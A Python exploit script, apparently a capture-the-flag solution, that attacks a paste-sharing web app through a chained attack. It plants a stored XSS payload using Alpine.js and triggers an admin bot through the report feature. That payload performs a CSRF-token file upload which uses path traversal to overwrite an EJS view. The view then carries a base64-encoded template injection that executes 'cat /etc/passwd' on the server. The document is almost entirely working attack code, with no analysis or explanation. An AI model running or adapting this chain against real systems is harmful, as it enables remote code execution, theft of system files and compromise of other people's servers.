import requests
import re
import time

requests.packages.urllib3.disable_warnings()

# User input
base_url = input("Base URL: ").strip()

session = requests.Session()

# 1. Register
reg_data = {'username': 'a', 'password': 'a'}
reg_resp = session.post(f"{base_url}/api/register", data=reg_data, verify=False)
print(f"[+] Registered: {reg_resp.status_code}")

# 2. Login
login_data = {'username': 'a', 'password': 'a'}
login_resp = session.post(f"{base_url}/api/login", data=login_data, verify=False)
print(f"[+] Logged in: {login_resp.status_code}")

# Extract cookies
cookies = session.cookies.get_dict()
print(f"[+] Cookies: {cookies}")

# 3. Submit paste (with payload)
payload_content = """<script src="https://cdnjs.cloudflare.com/ajax/libs/alpinejs/3.10.5/cdn.min.js" defer></script>
<div x-data x-init="(async () => {
    try {
      const b64 = 'PCU9IGdsb2JhbC5wcm9jZXNzLm1haW5Nb2R1bGUucmVxdWlyZSgiY2hpbGRfcHJvY2VzcyIpLmV4ZWNTeW5jKCJjYXQgL2V0Yy9wYXNzd2QiKS50b1N0cmluZygpICU+';
      const decoded = atob(b64);

      // now put it in a blob
      const blob = new Blob([decoded], { type: 'image/jpeg' });
      const fd = new FormData();
      fd.append('userFile', blob, '..／views///index.ejs.jpeg');
      fd.append('note', 'Extra text field');

      const resp = await fetch('/upload', {
        method: 'POST',
        body: fd,
        credentials: 'include',
	headers: {'x-csrf-token': 'b72a7f55d8ef61d0d27ee41830ca5cba'}
      });

      const text = await resp.text();
      console.log('Upload response:', text);
    } catch (e) {
      console.error('Upload error:', e);
    }
  })()"></div>"""

paste_data = {'content': payload_content}
paste_resp = session.post(f"{base_url}/paste", data=paste_data, verify=False, allow_redirects=False)
print(f"[+] Paste submitted: {paste_resp.status_code}")

# 4. Extract UUID from Location header
location = paste_resp.headers.get('Location')
if not location:
    print("[-] Could not extract paste UUID")
    exit()
paste_uuid_match = re.search(r'/paste/([a-f0-9\-]+)', location)
if not paste_uuid_match:
    print("[-] Invalid Location header")
    exit()
paste_uuid = paste_uuid_match.group(1)
print(f"[+] Paste UUID: {paste_uuid}")

# 5. Report
report_data = {'pasteId': paste_uuid}
report_resp = session.post(f"{base_url}/api../report", data=report_data, verify=False)
print(f"[+] Report submitted: {report_resp.status_code}")

# 6. Wait 10 seconds
print("[*] Waiting 10 seconds...")
time.sleep(10)

# 7. Fetch base URL to see results
final_resp = session.get(base_url, verify=False)
print(f"[+] Base URL fetched: {final_resp.status_code}")
print(final_resp.text[:500])  # preview first 500 chars
